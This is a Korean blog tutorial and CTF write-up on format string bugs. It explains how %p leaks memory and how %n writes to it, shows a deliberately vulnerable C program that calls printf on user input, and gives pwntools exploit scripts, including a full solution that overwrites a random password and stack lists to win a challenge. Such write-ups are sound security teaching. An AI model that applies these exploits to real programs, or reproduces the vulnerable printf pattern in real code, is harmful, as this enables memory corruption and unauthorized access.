---
tistoryBlogName: k0n9
tistoryTitle: format string bug
tistoryVisibility: "3"
tistoryCategory: "1117646"
tistorySkipModal: true
tistoryPostId: "33"
tistoryPostUrl: https://k0n9.tistory.com/33
---
### FSB란?
printf와 같은 함수의 인자 개수는 포맷 문자 개수로 결정된다. 이때 사용자의 포맷 스트링 입력이 그대로 buf에 값이 넣어지면 우리가 원하는 값을 출력이 가능하다.

#### 예제
```c
#include <stdio.h> 
void initialize() { 
setvbuf(stdin, NULL, _IONBF, 0); 
setvbuf(stdout, NULL, _IONBF, 0); 
} 

int main() 
{ 
initialize(); 

char* buf[0x40] = {0,}; 
printf("입력 : "); 
read(0, buf, 0x50); 

printf(buf); 
return 0; 
}
```
해당 코드에 aaaaaaaa를 입력하면 aaaaaaaa를 출력한다. 그런데 buf를 포멧스트링이 아니라 buf 변수 자체로 출력을 하기 때문에 FSB취약점이 생긴다.
![](https://i.imgur.com/6So09jn.png)

## %p

%p를 통해 메모리를 유출할 수 있고
%\[숫자]$p
를 통해 \[숫자]만큼 떨어져 있는 메모리를 출력이 가능하다.
%n을 통해 입력을 하고 %\[숫자]$n을 통해 \[숫자]만큼 떨어져있는 메모리에 입력이 가능하다.

aaaaaaaa %p %p %p %p %p %p를 입력하니 aaaaaaaa후에 메모리가 릭이 된다.
![](https://i.imgur.com/nW2ufat.png)


그리고 6번째 %p 에서는 0x6161616161616161 이 출력되는것을 보아 우리가 입력했던 aaaaaaaa부분인것을 알 수 있다. 64비트에서는 인자를 6개까지는 레지스터에 저장한다. 그래서 5번째 %p까지는 레지스터 값이 나오고 6번째 %p는 메모리의 값을 가져온다.
![](https://i.imgur.com/Ebb86XX.png)

이렇게 스택의 값을 알 수 있었다. 그리고 이 스택의 값을 변조하는 방법은 %n 서식 지정자를 사용하는 방법이 있다.

처음 출력자체가 rdi여서 최초의 %p는 rsi 부터 시작이다.
## %n

printf에서 다른 서식지정자들은 지정된 변수를 읽어서 문자열로 출력하는데 %n은 지정된 변수를 읽는게 아니라 %n 전까지 출력된 문자의 개수를 지정된 변수에 10진수 형식으로 쓴다. 즉 입력을 하는 포맷스트링인 것이다.

n이 4바이트, hn이 2바이트, hhn이 1바이트이다.

(1바이트의 최대는 ff 즉 문자열길이가 255개까지 가능하는소리). %p와 마찬가지로
%\[숫자]$n
하면 \[숫자]만큼 떨어진 곳에 입력한다.

\[예시]
```c
#include <stdio.h> 
int main(){ 
int a = 15; 
printf("%d\n", a); 
printf("1234%hn5678\n", &a); 
printf("%d\n", a); return 0; 
}
```
이 코드를 실행해보자
![](https://i.imgur.com/AmNfx6a.png)
a의 값이 15에서 4로 바뀌었다. 즉 포맷스트링으로 변수의 값을 바꿀 수 있다.

#### 예제
```c
#include <stdio.h>

void initialize() {
setvbuf(stdin, NULL, _IONBF, 0);
setvbuf(stdout, NULL, _IONBF, 0);
}

int key;

int main(){
initialize();

char buf[0x100];
read(0, buf, 0x100);
printf(buf);
printf("\n\n\n");

if (key){
    printf("Success\n");
}

return 0;
}
```

이런 코드가 있다고 하자. key값이 0이 아니면 Success가 출력된다. 오프셋을 구하면
![](https://i.imgur.com/AfFzvwl.png)
오프셋은 7이다. 페이로드는 이렇게 짤 수 있다.
```python
from pwn import *
p = process("./format_32")
e = ELF('./format_32')

key = e.symbols['key']

payload = b''
payload += p32(key)
payload += b'%7$n'

p.send(payload)
p.interactive()
```

우선 key의 주소값을 입력한다. 그러면 7번째 %p에 key값의 주소가 들어있다. 그러면 %7$n을 이용해 7만큼 떨어진 곳에 입력한다. 즉 key값의 주소에 입력을 한다. 어짜피 0이 아니면 되기에 key의 주소 길이만큼 key변수 안에 입력된다.
![](https://i.imgur.com/fG1s3Zr.png)

## %c

%n과 자주 같이 쓰이며 특정 길이만큼 출력해야 할때 쓰인다.
꼭 c가 아니여도 상관없다.
10만큼의 너비를 갖고 출력한다.
(9공백 + 1문자 = 10)


### 예제_제공파일

checksec
![](https://i.imgur.com/Mr4Zo7f.png)


c코드

```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s2[8]; // [rsp+0h] [rbp-E0h] BYREF
  __int64 v4; // [rsp+8h] [rbp-D8h]
  char v5[8]; // [rsp+10h] [rbp-D0h] BYREF
  __int64 v6; // [rsp+18h] [rbp-C8h]
  char naughtylist[8]; // [rsp+20h] [rbp-C0h] BYREF
  __int64 v8; // [rsp+28h] [rbp-B8h]
  char kindlist[132]; // [rsp+30h] [rbp-B0h] BYREF
  char wyv3rn[8]; // [rsp+B4h] [rbp-2Ch] BYREF
  int v11; // [rsp+BCh] [rbp-24h] BYREF
  FILE *stream; // [rsp+C0h] [rbp-20h]
  void *passwd; // [rsp+C8h] [rbp-18h]
  int v14; // [rsp+D4h] [rbp-Ch]
  int v15; // [rsp+D8h] [rbp-8h]
  int i; // [rsp+DCh] [rbp-4h]

  init();
  intro();
  i = 0;
  v14 = 0;
  v11 = 0;
  v15 = 0;
  *(_QWORD *)wyv3rn = 0x6E7233767977LL;
  memset(kindlist, 0, 0x80uLL);
  *(_QWORD *)naughtylist = 0LL;
  v8 = 0LL;
  *(_QWORD *)v5 = 0LL;
  v6 = 0LL;
  *(_QWORD *)s2 = 0LL;
  v4 = 0LL;
  passwd = malloc(8uLL);
  stream = fopen("/dev/urandom", "r");
  fread(passwd, 7uLL, 1uLL, stream);
  strcpy(naughtylist, wyv3rn);
  while ( 1 )
  {
    menu();
    fflush(stdout);
    __isoc99_scanf("%d", &v11);
    if ( v11 == 3 )
      break;
    if ( v11 <= 3 )
    {
      if ( v11 == 1 )
      {
        puts("\n-Kind kid list-");
        for ( i = 0; i <= 5; ++i )
          puts(&kindlist[16 * i]);
        puts("\n-Naughty kid list-");
        for ( i = 0; i <= 7; ++i )
          putchar(naughtylist[i]);
        puts(&byte_2072);
      }
      else if ( v11 == 2 )
      {
        printf("\nPassword : ");
        fflush(stdout);
        __isoc99_scanf("%8s", s2);
        if ( !strncmp((const char *)passwd, s2, 7uLL) )
        {
          printf("Name : ");
          fflush(stdout);
          __isoc99_scanf("%8s", v5);
          if ( v15 > 7 )
            puts("Kind list full");
          else
            strcpy(&kindlist[16 * v15++], v5);
        }
        else
        {
          printf(s2);
          puts(" is Wrong password!");
        }
      }
    }
  }
  v14 = 0;
  if ( !strcmp(kindlist, "wyv3rn") )
  {
    for ( i = 0; i <= 5; ++i )
    {
      if ( !strcmp(&naughtylist[i], &wyv3rn[i]) )
      {
        puts("Wyv3rn : My name is still remain on the naughty kid list!");
        exit(0);
      }
    }
    puts("\nWyv3rn : You did it!");
    puts("Wyv3rn : Here is flag!");
    flag();
    exit(0);
  }
  puts("Wyv3rn : My name is not on the kind kid list!");
  exit(0);
}
```

시작 화면
![](https://i.imgur.com/1Yh5262.png)

요약하자면 wyn3rn이라는 사람이 있고 3가지 경우가 있다. 
1.은 kind list와 naughty list를 출력해준다.
2.는 kind list에 추가를 한다.
3.wyv3rn에게 간다.

![](https://i.imgur.com/GXtCNav.png)
현재 kind kid 에는 아무도 없고 naughty kid에는 wyn3rn이 있다.
우리의 목적은 kind kid에 wyv3rn 을 넣어야 하고 naughty kid에는 wyv3rn을 없에야 한다. 

![](https://i.imgur.com/oiBv2x8.png)
그런데 2번항목을 실행하려면 password를 입력해야 한다. password는 랜덤 값이다.
![](https://i.imgur.com/WHYuBhA.png)
password는 malloc으로 할당되어있다. 

![](https://i.imgur.com/gA8gVjo.png)
여기서 password가 틀릴시 \[내가 입력한 문자열] + is Wrong password! 라고 출력을 하는데 이 때 format string bug 취약점이 발생한다.

그래서 %n을 통해 password의 포인터를 참조해서 password의 값을 바꿀 수 있다.
![](https://i.imgur.com/TEpU8YV.png)

offset은 31만큼 차이난다.

password를 뚫으면 wyv3rn를 입력하고 이제는 naughty kid를 지워야 한다. 이럴 때에는 kindlist에 nuaghty kid의 주소를 넣고 kind kid를 참조하여 값을 조작할 수 있다. 이때 8바이트 전부 덮어야 하는데 %n은 최대 4바이트여서 2번에 나눠서 한다.

naughty 의 address는 %p로 leak 하면 된다.

익스코드

```python
from pwn import *
  
context.log_level = 'debug'
p = process("./chall")
  
pause()
  
p.sendlineafter(b">> ", b'2')
p.sendlineafter(b"Password : ", b'%31$n')
p.sendlineafter(b">> ", b'2')
passwd = 0x0068518c00000000
p.sendlineafter(b"Password : ", p64(passwd))
  
p.sendlineafter(b"Name : ", b'wyv3rn')  
  
 
 
p.sendlineafter(">> ", b'2')
p.sendlineafter("Password : ", b'%p')
p.recvuntil(b"0x")
stack_add = int(p.recv(12), 16)
naughty_add = stack_add + 0x20
kind_add = naughty_add - 0x8
  
p.sendlineafter(b">> ", b'2')
p.sendlineafter(b"Password : ", p64(passwd))
p.sendlineafter(b"Name : ", p64(naughty_add))
  
 
p.sendlineafter(b">> ", b'2')
p.sendlineafter(b"Password : ", b'%14$n')
  
naughty_add2 = stack_add + 0x24
p.sendlineafter(b">> ", b'2')
p.sendlineafter(b"Password : ", p64(passwd))
p.sendlineafter(b"Name : ", p64(naughty_add2))
  
p.sendlineafter(b">> ", b'2')
p.sendlineafter(b"Password : ", b'%16$n')
  
p.sendlineafter(b">> ", b'3')
  
p.interactive()
```

![](https://i.imgur.com/9I4W813.png)
